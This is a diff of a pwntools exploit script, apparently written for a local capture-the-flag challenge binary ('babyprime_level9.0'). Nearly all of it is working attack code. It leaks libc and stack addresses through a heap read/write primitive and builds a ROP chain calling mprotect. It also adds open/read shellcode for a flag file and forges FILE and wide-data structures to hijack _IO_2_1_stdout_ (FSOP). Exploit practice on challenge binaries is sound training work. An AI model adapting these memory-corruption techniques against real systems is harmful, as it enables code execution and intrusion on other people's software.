@@ -97,12 +97,12 @@ def arbitrary_read(r1, r2, addr, heap_base_addr, debug, p, s):
 def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, p, s):
 	global idx
 	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
-	if debug:
-		gdb.attach(p, s)
-		pause()
-		r1.sendline(f"scanf {idx - 1}".encode())
-		r1.sendline(content)
-		r1.interactive()
+#	if debug:
+#		gdb.attach(p, s)
+#		pause()
+#		r1.sendline(f"scanf {idx - 1}".encode())
+#		r1.sendline(content)
+#		r1.interactive()
 	r1.sendline(f"scanf {idx - 1}".encode())
 	r1.sendline(content)
 #	r1.interactive()
@@ -111,6 +111,12 @@ def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, p, s):
 	
 def exploit(r1, r2, p):
 	s = '''
+	set $mybase = (unsigned long)&challenge - 0x1a64
+	b * $mybase + 0x1c43
+	b * $mybase + 0x020eb
+	b * $mybase + 0x02158
+	b * $mybase + 0x01e68
+	b * $mybase + 0x02058
 	b * fwrite
 	b * fwrite+71
 	b * fwrite+189 
@@ -128,7 +134,7 @@ def exploit(r1, r2, p):
 		
 		# pivoting around memory, so we need to leak many times
 		
-		location1 = ((leak & ~0xff) << 12) + 0x8a0
+		location1 = ( ( leak & ~0xff) << 12) + 0x8a0
 		print(hex(location1))
 		
 		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, p, s)
@@ -145,24 +151,17 @@ def exploit(r1, r2, p):
 		
 		rbp_addr = stack_leak - 0x810
 		libc_base = libc_leak - 0x219c80
-		random_pointer = stack_leak - 0xd80 - 0x20
+		
 		# gadgets
-		pop_rdi = libc_base + 0x000000000002a3e5 # rop chain
-		pop_rsi = libc_base + 0x000000000002be51 # rop chain
-		pop_rdx = libc_base + 0x00000000000796a2 # rop chain
+		binsh_addr = libc_base + 0x1d8698
+		setuid = libc_base + 0xec0d0
+		system = libc_base + 0x50d70
+		pop_rdi = libc_base + 0x000000000002a3e5
+		pop_rsi = libc_base + 0x000000000002be51
+		pop_rdx = libc_base + 0x00000000000796a2
+		execve = libc_base + 0xeb080
 		
 		libc = p.elf.libc
-		
-		contains_IO_wfile_overflow = libc_base + 0x2160d8 # fsop
-		mprotect_addr = libc_base + libc.symbols['mprotect'] # rop chain
-		
-		
-		shellcode_addr = (leak << 12) + 0x3000 # rop chain
-		fake_wide_data_addr = ((leak & ~0xff) << 12) + 0x1000 # fsop 
-		_IO_2_1_stdout_ = ((leak & ~0xff) << 12) + 0xd50 # fsop 
-		setcontext = libc_base + 0x539e0 + 61 # fsop
-		
-		
 		
 		context.arch = 'amd64'
 		
@@ -173,7 +172,7 @@ def exploit(r1, r2, p):
 		    push 257
 		    pop rax
 		    mov rdi, -100       /* dirfd: AT_FDCWD */
-		    lea rsi, [rip+flag]
+		    lea rsi, [rip+flag] /* pointer to "CDr46w9anrq3vg0Z" */
 		    xor edx, edx        /* flags: O_RDONLY */
 		    syscall
 
@@ -199,10 +198,10 @@ def exploit(r1, r2, p):
 
 		''')
 		
-
-		
-			
-		
+		mprotect_addr = libc_base + libc.symbols['mprotect']
+		shellcode_addr = (leak << 12) + 0x1000
+		rop_chain_addr = (stack_leak & ~0xffff)
+		print("rop chain address: ", hex(rop_chain_addr))		
 		print("shellcode address: ", hex(shellcode_addr))
 		
 		# mprotect(shellcode_addr, 0x1000, 7)
@@ -213,7 +212,40 @@ def exploit(r1, r2, p):
 		rop_chain += p64(pop_rdx)          
 		rop_chain += p64(7)                 # PROT_READ|PROT_WRITE|PROT_EXEC
 		rop_chain += p64(mprotect_addr)     
-		payload = rop_chain + p64(shellcode_addr + len(rop_chain) + 8) + shellcode # jump to our shellcode	
+		payload = rop_chain + p64(shellcode_addr) # jump to our shellcode
+		
+		print("Length of payload = ", hex(len(payload)))
+		
+		badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"
+
+		print(f"Checking bad chars (whitespaces)")
+		if any(bad in shellcode for bad in badchars):
+			print("WARNING: Shellcode contains bad characters!")
+			print(f"Shellcode hex: {shellcode.hex()}")
+			
+		if any(bad in payload for bad in badchars):
+			print("WARNING: ROP payload contains bad characters!")
+			print(f"Payload hex: {payload.hex()}")
+		
+		# pre-write shellcode on an unimportant area on the stack
+		
+		
+	
+	
+
+		
+		setcontext = libc_base + 0x539e0 + 61
+		important_pointer_1 = libc_base + 0x21ba70
+#		important_pointer_1 = ( ( leak & ~0xff) << 12) + 0xe30
+		important_pointer_1 = ( ( leak & ~0xff) << 12) + 0xf50
+		
+		contains_IO_wfile_overflow = libc_base + 0x2160d8
+		_IO_wfile_overflow = libc_base + 0x86390
+		_IO_2_1_stdout_ = libc_leak + 0xb00
+		_IO_2_1_stdout_ = ( ( leak & ~0xff) << 12) + 0xd50
+#		_IO_2_1_stdout_ = ( ( leak & ~0xff) << 12) + 0x870 # 0x0b here, badchars!
+		
+		random_pointer = stack_leak - 0xd80
 		
 		
 		fake_wide_data = b'\x00' * 0x20
@@ -226,7 +258,7 @@ def exploit(r1, r2, p):
 		fake_wide_data += p64(0) # 0x80
 		fake_wide_data += p64(0) # 0x90
 		fake_wide_data += p64(0) # 0x98
-		fake_wide_data += p64(shellcode_addr) # 0xa0
+		fake_wide_data += p64(rop_chain_addr) # 0xa0
 		fake_wide_data += p64(pop_rdi) # 0xa8
 		fake_wide_data += p64(0) # 0xb0
 		fake_wide_data += p64(0) # 0xb8
@@ -234,62 +266,50 @@ def exploit(r1, r2, p):
 		fake_wide_data += p64(0) # 0xc8
 		fake_wide_data += p64(0) # 0xd0
 		fake_wide_data += p64(0) # 0xd8	
-		fake_wide_data += p64(fake_wide_data_addr)
+		fake_wide_data += p64((( leak & ~0xff) << 12) + 0x1000)
 		
 		
-		fsop_payload = b'\x00' * 0x78
-		fsop_payload += p64(0) # 0x78
-		fsop_payload += p64(0) # 0x80
-		fsop_payload += p64(random_pointer - 8)  # 0x88, to pass fwrite+71 cmp    qword ptr [rdi + 8], r15. which needs a pointer like `0x76c7cf200640` so that `0x76c7cf200640 - 0x76c7cf200640`
-		fsop_payload += b'\x41' * 0x10  
-		fsop_payload += p64(fake_wide_data_addr)  
+		fsop_payload2 = b'\x00' * 0x78
+		fsop_payload2 += p64(0) # 0x78
+		fsop_payload2 += p64(0) # 0x80
+		fsop_payload2 += p64(random_pointer - 8)  # 88
+		fsop_payload2 += b'\x41' * 0x10  
+		fsop_payload2 += p64((( leak & ~0xff) << 12) + 0x1000)  
 		# setting up rsp
-		fsop_payload += b'\x41' * 0x8
-		fsop_payload += p64(shellcode_addr)# rsp would be set to this
-		fsop_payload += p64(pop_rdi) # rcx would be set to this
-		fsop_payload += p64(0xffffffffffffffff) 
-		fsop_payload += b'\x41' * 0x8
-		fsop_payload += b'\x41' * 0x8
-		fsop_payload += p64(contains_IO_wfile_overflow - 0x38) #0xd8
-		
-		badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"
+		fsop_payload2 += b'\x41' * 0x8
+		fsop_payload2 += p64(rop_chain_addr)# rsp would be set to this
+		fsop_payload2 += p64(pop_rdi) # rcx would be set to this
+		fsop_payload2 += p64(0xffffffffffffffff) 
+		fsop_payload2 += b'\x41' * 0x8
+		fsop_payload2 += b'\x41' * 0x8
 
-		print(f"Checking bad chars (whitespaces)")
-		if any(bad in shellcode for bad in badchars):
-			print("WARNING: Shellcode contains bad characters!")
-			print(f"Shellcode hex: {shellcode.hex()}")
-			
-		if any(bad in payload for bad in badchars):
-			print("WARNING: ROP payload contains bad characters!")
-			print(f"Payload hex: {payload.hex()}")
 
-		if any(bad in fake_wide_data for bad in badchars):
-			print("WARNING: fake_wide_data contains bad characters!")
-			print(f"fake_wide_data hex: {fake_wide_data.hex()}")
+		fsop_payload2 += p64(contains_IO_wfile_overflow - 0x38) #0xd8
+		
+
+		
+		
 			
-		if any(bad in fsop_payload for bad in badchars):
-			print("WARNING: fsop_payload contains bad characters!")
-			print(f"fsop_payload hex: {fsop_payload.hex()}")
+		#fsop_payload = p64(setcontext) # 0x78
+		arbitrary_write(r1, r2, shellcode_addr, leak, shellcode, 0, p, s)
+		arbitrary_write(r1, r2, rop_chain_addr, leak, payload, 0, p, s)
 		
-		arbitrary_write(r1, r2, shellcode_addr, leak, payload, 0, p, s)
+		arbitrary_write(r1, r2, ( ( leak & ~0xff) << 12) + 0x1000, leak, fake_wide_data, 0, p, s)
 		
-		arbitrary_write(r1, r2, fake_wide_data_addr, leak, fake_wide_data, 0, p, s)
+		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload2, 1, p, s)
 		
-		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload, 0, p, s)
-		
-		gdb.attach(p, s)
-		pause()
-		r1.sendline(b"haha")	
-		r1.interactive()	
+		#gdb.attach(p, s)
+		#pause()
+
 		
 		
 		try:
 			r1.clean()
 			r2.clean()
 			p.clean()
-
-			r1.sendline(b"haha")
-
+#			r2.sendline("quit")
+			r1.sendline(b"send_flag w")
+			
 			response = p.recvall(timeout=2)
 			print(response)
 		except Exception as e:
@@ -297,6 +317,7 @@ def exploit(r1, r2, p):
 		
 		return True
 	else:
+		#pause()
 		print("Failed to leak")
 		return False
 	
@@ -309,7 +330,7 @@ def main():
 		idx = 2
 		
 		try: # code that might fail 
-			binary = './babyprime_level8.0'
+			binary = './babyprime_level9.0'
 			p = process(binary)
 			r1 = remote("localhost", 1337, timeout = 1)
 			r2 = remote("localhost", 1337, timeout = 1)
